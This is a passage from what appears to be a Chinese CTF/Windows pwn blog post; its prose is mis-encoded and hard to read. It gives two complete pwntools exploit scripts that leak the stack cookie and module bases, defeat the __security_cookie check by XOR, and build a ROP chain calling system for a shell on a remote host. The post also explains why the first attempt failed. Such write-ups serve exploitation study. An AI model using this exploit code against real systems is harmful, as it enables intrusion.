class="string">b&#x27;a&#x27;</span>*<span class="number">0x180</span>)</span><br><span class="line">ntdll_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x526b1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ntdll_base ==&gt; &#x27;</span>,<span class="built_in">hex</span>(ntdll_base))</span><br><span class="line"></span><br><span class="line">pop_rbx_ret=<span class="number">0x137d</span>+ntdll_base</span><br><span class="line">pop_rcx_ret=<span class="number">0x1a853</span>+ntdll_base</span><br><span class="line">call_puts=<span class="number">0x10a6</span>+base_addr</span><br><span class="line">puts_got=<span class="number">0x2180</span>+base_addr</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(second_stack_cookie)</span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload+=p64(pop_rbx_ret)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(pop_rcx_ret)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(call_puts)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">ucrtbase=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x83D50</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ucrtbase ==&gt; &#x27;</span>,<span class="built_in">hex</span>(ucrtbase))</span><br><span class="line"></span><br><span class="line">cmd_addr=ucrtbase+<span class="number">0xD0CB0</span></span><br><span class="line">system_addr=ucrtbase+<span class="number">0xae5c0</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(second_stack_cookie)</span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload+=p64(pop_rcx_ret)</span><br><span class="line">payload+=p64(cmd_addr)</span><br><span class="line">payload+=p64(system_addr)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œåå‘ç°æ²¡æœ‰æˆåŠŸè°ƒç”¨åˆ° <code>system</code> å‡½æ•°ï¼Œç»è¿‡è°ƒè¯•ï¼Œæ‰¾åˆ°æ˜¯ <code> __security_check_cookie</code> å‡½æ•°çš„æ£€æŸ¥æ²¡è¿‡ã€‚å› ä¸ºä¸Šé¢æ‰§è¡Œ <code>call puts</code> æ”¹å˜äº† <code>rsp</code> çš„å€¼ï¼Œæ‰€ä»¥æ³„éœ²ç¬¬äºŒæ¬¡çš„ <code>StackCookie</code> ä¹Ÿä¸èƒ½ç”¨äº†ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬è¦æ‹¿åˆ°æ ˆåœ°å€å’Œ <code>__security_cookie</code> çš„å€¼ï¼Œåè€…å¯ä»¥é€šè¿‡ <code>ROP</code> æ³„éœ²å‡ºæ¥ï¼Œåˆå› ä¸ºå¼‚æˆ–è¿ç®—ï¼ŒçŸ¥é“ä¸‰ä¸ªå€¼ä¸­çš„ä»»æ„ä¸¤ä¸ªéƒ½å¯ä»¥æ±‚å‡ºæ¥ç¬¬ä¸‰ä¸ªï¼Œæ ˆåœ°å€æ³„éœ²ä¸å‡ºæ¥ï¼Œä½†ä¹‹å‰å·²ç»æ³„éœ²äº† <code>StackCookie</code> çš„å€¼ï¼Œç”¨ <code>StackCookie</code> å’Œ <code>__security_cookie</code>  è¿›è¡Œå¼‚æˆ–å°±å¯ä»¥æ‹¿åˆ°æ ˆåœ°å€ã€‚</p>
<p>æ‰€ä»¥ç¬¬ä¸€æ¬¡ <code>ROP</code> ä¸èƒ½ç€æ€¥æ³„éœ² <code>ucrtbase</code> çš„å€¼ï¼ˆ<strong>ä½†æ˜¯åˆ°è¿™é‡Œæˆ‘æƒ³è¡¥å……ä¸€ä¸‹ï¼Œå°±ç®—æ˜¯æ‰“è¿œç¨‹ï¼Œå› ä¸ºæ¨¡å—åŸºåœ°å€æ˜¯å›ºå®šçš„ï¼Œ<code>ntdll.dll</code> å’Œç¨‹åºåŸºåœ°å€å…¶å®åˆ†åˆ«æ³„éœ²ä¸€æ¬¡å°±å¯ä»¥äº†ï¼Œä¸éœ€è¦æŠŠè„šæœ¬å†™è¿™ä¹ˆé•¿ï¼Œå½“ç„¶è¿™æ ·å†™ä¹Ÿæ²¡å•¥é—®é¢˜</strong>ï¼‰ï¼Œè€Œæ˜¯å…ˆæ³„éœ²å‡º <code>__security_cookie</code> çš„å€¼ã€‚ç„¶åæ±‚å‡ºæ¥æ ˆåœ°å€ï¼Œä¹‹åæ¯æ¬¡æº¢å‡ºçš„æ—¶å€™ï¼Œéƒ½è¦æ‹¿æ–°çš„ <code>rsp</code> ï¼ˆå› ä¸ºä¼šè¢«ä¸Šä¸€æ¬¡ <code>rop</code> ç»™å½±å“ï¼‰å’Œ <code>__security_cookie</code> è¿›è¡Œå¼‚æˆ–ï¼Œæ±‚å‡ºæœ€æ–°çš„ <code>StackCookie</code> å†è¿›è¡Œ <code>rop</code></p>
<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&quot;192.168.0.104&quot;</span>,<span class="number">6666</span>)</span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x118</span>-<span class="number">0x18</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">first_stack_cookie=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;first&gt;&gt; stack_cookie ==&gt; &#x27;</span>,<span class="built_in">hex</span>(first_stack_cookie))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x118</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x118</span>)</span><br><span class="line">base_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x12f4</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;base_addr ==&gt; &#x27;</span>,<span class="built_in">hex</span>(base_addr))</span><br><span class="line"></span><br><span class="line">main_addr=base_addr+<span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(first_stack_cookie)</span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload+=p64(main_addr)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ntdll.dll</span></span><br><span class="line"><span class="string">0x000000018000137d : pop rbx ; ret</span></span><br><span class="line"><span class="string">0x000000018001a853 : pop rcx ; ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">base</span></span><br><span class="line"><span class="string">00000001400010A6     call    cs:puts</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#==============================================================================</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">second_stack_cookie=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;second&gt;&gt; stack_cookie ==&gt; &#x27;</span>,<span class="built_in">hex</span>(second_stack_cookie))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x180</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x180</span>)</span><br><span class="line">ntdll_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x526b1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ntdll_base ==&gt; &#x27;</span>,<span class="built_in">hex</span>(ntdll_base))</span><br><span class="line"></span><br><span class="line">pop_rbx_ret=<span class="number">0x137d</span>+ntdll_base</span><br><span class="line">pop_rcx_ret=<span class="number">0x1a853</span>+ntdll_base</span><br><span class="line">call_puts=<span class="number">0x10a6</span>+base_addr</span><br><span class="line">puts_got=<span class="number">0x2180</span>+base_addr</span><br><span class="line">cookie_ptr=<span class="number">0x3008</span>+base_addr</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(second_stack_cookie)</span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload+=p64(pop_rbx_ret)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(pop_rcx_ret)</span><br><span class="line">payload+=p64(cookie_ptr)</span><br><span class="line">payload+=p64(call_puts)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">cookie=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;cookie ==&gt; &#x27;</span>,<span class="built_in">hex</span>(cookie))</span><br><span class="line">stack_addr=cookie^second_stack_cookie</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stack_addr ==&gt; &#x27;</span>,<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64((stack_addr+<span class="number">0x160</span>)^cookie)</span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload+=p64(pop_rbx_ret)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(pop_rcx_ret)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(call_puts)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">ucrtbase=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x83D50</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ucrtbase ==&gt; &#x27;</span>,<span class="built_in">hex</span>(ucrtbase))</span><br><span class="line"></span><br><span class="line">cmd_addr=ucrtbase+<span class="number">0xD0CB0</span></span><br><span class="line">system_addr=ucrtbase+<span class="number">0xae5c0</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64((stack_addr+<span class="number">0x2c0</span>)^cookie)</span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload+=p64(pop_rcx_ret)</span><br><span class="line">payload+=p64(cmd_addr)</span><br><span class="line">payload+=p64(system_addr)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¡¥å……ï¼šæœ‰æ—¶å€™ä¸çŸ¥é“ä¸ºä»€ä¹ˆè®¡ç®—å‡º <code>rsp</code> ä¼šé”™è¯¯ï¼Œå¯¼è‡´ <code>StackCookie</code> æ±‚å‡ºæ¥æ—¶é”™çš„ï¼Œä»è€Œè§¦å‘äº† <code>__security_check_cookie</code> å‡½æ•°ï¼Œä¸€æ¬¡æ²¡æœ‰æˆåŠŸçš„è¯å°±å¤šè¯•å‡ æ¬¡ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240328171612752.png" alt="image-20240328171612752"></p>
<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg5OTcxMDM1NA==&mid=2247483906&idx=1&sn=c198544fb3c781edb8b89f06f7483c59&chksm=c04e6efff739e7e9f72ad443021101e12fe775f86190a844e4420fa16143edb96aa815122582&mpshare=1&scene=23&srcid=0308XeI2W7Nn5oEyLeEo8N14&sharer_shareinfo=5a5e4a83d3a31bced0e2c5cf43b4a5a4&sharer_shareinfo_first=5a5e4a83d3a31bced0e2c5cf43b4a5a4#rd">æ ¼å¼åŒ–å­—ç¬¦ä¸²æ‰“å‡ºæ²¡æœ‰å›å¤´è·¯ï¼ˆä¸‹ï¼‰â€”â€”å›å¤´æœ›æœˆ (qq.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/189093#h2-0">Windowsä¸‹æ¼æ´åˆ©ç”¨â€”â€”S.E.Hæ·±å…¥åˆ†æ-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.z1r0.top/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/#%E5%88%A9%E7%94%A8pwntools%E7%BC%96%E5%86%99exp">win pwnåˆæ¢ï¼ˆäºŒï¼‰ (z1r0.top)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pwnfeifei/p/17162374.html">windows pwnï¼ˆä¸€ï¼‰ - ç‹’çŒ©æ©™ - åšå®¢å›­ (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11865?time__1311=mqmx0DBD9DyDnDfx4BuQx20Qqmh1=GnieD&alichlgref=https://www.bing.com/#toc-0">win pwnåˆæ¢ï¼ˆä¸€ï¼‰ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://gdufs-king.github.io/2020/11/09/Windows-pwn%E5%85%A5%E9%97%A8/">Windows-pwnå…¥é—¨ - V1ct0rçš„åšå®¢ (gdufs-king.github.io)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/188170">Windows-pwnè§£é¢˜åŸç†&amp;åˆ©ç”¨æ‰‹æ³•è¯¦è§£-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45323960/article/details/131312600">windows pwn åŸºç¡€çŸ¥è¯†-CSDNåšå®¢</a></p>
<p><a target="_blank" rel="noopener" href="https://sky123.blog.csdn.net/article/details/131697469?spm=1001.2014.3001.5502">https://sky123.blog.csdn.net/article/details/131697469?spm=1001.2014.3001.5502</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8531?time__1311=n4+xuDgDBDyDRGDnDGhxBk8oQbHO+QC+CCeD&alichlgref=https://www.google.com/">Windows pwnå­¦ä¹ ç¬”è®° - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://ret2ver.github.io/2021/10/01/PE32-Advanced-stack-buffer-overflow/">https://ret2ver.github.io/2021/10/01/PE32-Advanced-stack-buffer-overflow/</a>)</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/windows-pwn/" rel="tag"># windows_pwn</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/posts/976bb1b4.html" rel="prev" title="æµ…å°Qiling">
                  <i class="fa fa-chevron-left"></i> æµ…å°Qiling
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/posts/2ddfe893.html" rel="next" title="ä¸çŸ¥ä»å“ªç¿»å‡ºæ¥çš„ house of obstack å­¦ä¹ æ€»ç»“">
                  ä¸çŸ¥ä»å“ªç¿»å‡ºæ¥çš„ house of obstack å­¦ä¹ æ€»ç»“ <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">ZIKH26</span>
  </div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> å¼ºåŠ›é©±åŠ¨
  </div>

    </div>
  </footer>

  

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>





  <script src="/js/third-party/pace.js"></script>


  





</body>
</html>
